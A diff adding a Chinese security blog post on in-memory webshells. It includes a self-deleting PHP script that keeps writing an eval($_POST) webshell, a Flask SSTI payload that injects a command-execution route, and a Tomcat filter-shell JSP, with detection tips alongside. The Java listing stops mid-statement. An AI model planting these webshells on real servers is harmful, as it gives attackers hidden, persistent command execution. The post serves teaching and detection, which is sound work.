@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/wan1/css/main.css">
+
+
+<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="初探内存马通过此文理解内存马，掌握内存马的基本原理以及一些基本分类，和一些基础知识，有助于后面我们的各种技术研究。  内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器，不容易清除。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。 1234大概原理：是先由客户端发起一个web请求，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探内存马">
+<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="十三の博客">
+<meta property="og:description" content="初探内存马通过此文理解内存马，掌握内存马的基本原理以及一些基本分类，和一些基础知识，有助于后面我们的各种技术研究。  内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器，不容易清除。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。 1234大概原理：是先由客户端发起一个web请求，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/1662006657_63103581f3f1446ecb7e9.png">
+<meta property="article:published_time" content="2022-12-25T13:34:19.000Z">
+<meta property="article:modified_time" content="2022-12-25T13:35:30.200Z">
+<meta property="article:author" content="十三">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/1662006657_63103581f3f1446ecb7e9.png">
+
+<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-cn'
+  };
+</script>
+
+  <title>初探内存马 | 十三の博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/wan1/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">十三の博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-ctf做题笔记">
+
+    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
+
+  </li>
+        <li class="menu-item menu-item-python">
+
+    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
+
+  </li>
+        <li class="menu-item menu-item-java">
+
+    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
+
+  </li>
+        <li class="menu-item menu-item-读书笔记">
+
+    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
+
+  </li>
+        <li class="menu-item menu-item-渗透测试">
+
+    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
+
+  </li>
+        <li class="menu-item menu-item-基础">
+
+    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
+
+  </li>
+        <li class="menu-item menu-item-轮子">
+
+    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
+
+  </li>
+        <li class="menu-item menu-item-漏洞库">
+
+    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
+
+  </li>
+        <li class="menu-item menu-item-工具">
+
+    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
+
+  </li>
+        <li class="menu-item menu-item-代码审计">
+
+    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
+
+  </li>
+        <li class="menu-item menu-item-逆向">
+
+    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
+
+  </li>
+        <li class="menu-item menu-item-应急响应">
+
+    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
+
+  </li>
+        <li class="menu-item menu-item-免杀">
+
+    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
+
+  </li>
+        <li class="menu-item menu-item-靶场">
+
+    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
+
+  </li>
+        <li class="menu-item menu-item-cve申请">
+
+    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
+
+  </li>
+        <li class="menu-item menu-item-c语言">
+
+    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/wan1/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          初探内存马
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-25 21:34:19 / 修改时间：21:35:30" itemprop="dateCreated datePublished" datetime="2022-12-25T21:34:19+08:00">2022-12-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/wan1/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="初探内存马"><a href="#初探内存马" class="headerlink" title="初探内存马"></a>初探内存马</h1><p>通过此文理解内存马，掌握内存马的基本原理以及一些基本分类，和一些基础知识，有助于后面我们的各种技术研究。</p>
+<p> 内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器，不容易清除。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">大概原理：</span><br><span class="line">是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/wan1/wan1/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/1662006657_63103581f3f1446ecb7e9.png" alt="img"></p>
+<p>以上是内存马的相关分类</p>
+<p>下面基本介绍一下各种内存马。</p>
+<h1 id="各种内存马"><a href="#各种内存马" class="headerlink" title="各种内存马"></a>各种内存马</h1><h2 id="php内存马"><a href="#php内存马" class="headerlink" title="php内存马"></a>php内存马</h2><p>php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。</p>
+<p><strong>检测思路</strong></p>
+<p>1.检查所有php进程处理请求的持续时间</p>
+<p>2.检测执行文件是否在文件系统真实存在</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。</span></span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//unlink(__FILE__)函数：删除文件。</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = ‘<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;zzz&quot;</span>]) <span class="meta">?&gt;</span>’;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;22.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">//file_put_contents函数：将一个字符串写入文件。</span></span><br><span class="line">usleep(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">//usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//看看最基础的代码嗯就是不断的将一句话木马传入22.php文件中去。</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>如何处置</strong></p>
+<p>对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。</p>
+<p>其实也简单，可以写一个条件竞争的文件来克制不死马，其中必须将usleep改为小雨php不死马的参数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = ‘<span class="number">2222</span>’;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;22.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="python内存马"><a href="#python内存马" class="headerlink" title="python内存马"></a>python内存马</h2><p>Python内存马利用flask框架中ssti注入来实现，flask框架中在web应用模板渲染的过程中用到render_template_string()进行渲染但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现python内存马的注入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码实例</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    content = request.args.get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/index?=content%7B%7Ba.__init__.__globals__%5B%27__builtins__%27%5D%5B%27eval%27%5D(%22app.add_url_rule(%27/shell1%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,%7B%27_request_ctx_stack%27:url_for.__globals__%5B%27_request_ctx_stack%27%5D,%27app%27:url_for.__globals__%5B%27current_app%27%5D%7D)%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p>这就是payload，解一下url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/index?=content&#123;&#123;a.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell1&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>手续看是写入了一个shell1的路由，一旦访问这个路由就会执行whoami命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__class__:返回调用的参数类型</span><br><span class="line"></span><br><span class="line">__bases__:返回基类列表</span><br><span class="line"></span><br><span class="line">__builtins__:内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等</span><br><span class="line"></span><br><span class="line">__globals__：以字典的形式返回函数所在的全局命名空间所定义的全局变量,这里的函数可以是类class的构造函数如__init__,也可以是flask的函数如url_for等。</span><br><span class="line"></span><br><span class="line">add_url_rule注册了一个/shell的路由，__init__相当于构造函数，定义自己的属性，通过__init__.__globals__得到他们的命名空间从而得到builtins就可以执行内置函数如eval, exec, open等。</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测思路</strong></p>
+<p>1.查看所有内建模块中是否包含eval、exec等可以执行代码的函数如：class ‘warnings.catch_warnings’、class ‘site.Quitter’等。</p>
+<p>2.检测self.add_url_rule()中特殊名字的路由如shell等。</p>
+<h2 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h2><p>在内存马家族中，最多也最常见的就是java类别的，后续我会补充各种类型的内存马，通过代码，流量，逐步进行分析。</p>
+<p><strong>fillter型内存马</strong><br> Filter：FIlter为过滤器可以对用户的一些请求进行拦截修改等操作。当web.xml中注册了一个Filter来对某个 Servlet 程序进行拦截处理时该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息进行修改。filter型内存马是将命令执行的文件通过动态注册成一个恶意的filter，这个filter没有落地文件并可以让客户端发来的请求通过它来做命令执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">filter检测思路：</span><br><span class="line"></span><br><span class="line">带有特殊含义的filter的名字比如shell等。</span><br><span class="line"></span><br><span class="line">Filter的优先级，filter内存马需要将filter调至最高</span><br><span class="line"></span><br><span class="line">查看web.xml中有没有filter配置</span><br><span class="line"></span><br><span class="line">检测特殊的classloader</span><br><span class="line"></span><br><span class="line">检测classloader路径下没有class文件</span><br><span class="line"></span><br><span class="line">检测Filter中的doFilter方法是否有恶意代码</span><br></pre></td></tr></table></figure>
+
+<p>filter内存马实战：</p>
+<p> 这里我们将公开的filter类型的内存马文件直接上传到tomcat网站下，访问内存马后就植入成功了，植入成功后在删掉相对的jsp文件也不会影响内存马的运行，但是重启tomcat服务器后内存马即失效。注入成功后在路径后加入?cmd=后跟命令即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;!-- page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span></span><br><span class="line">page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> --&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">String cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (cmd!= <span class="keyword">null</span>) &#123;</span><br><span class="line">Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line"><span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">servletResponse.getOutputStream().flush();</span><br><span class="line">servletResponse.getOutputStream().close();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) 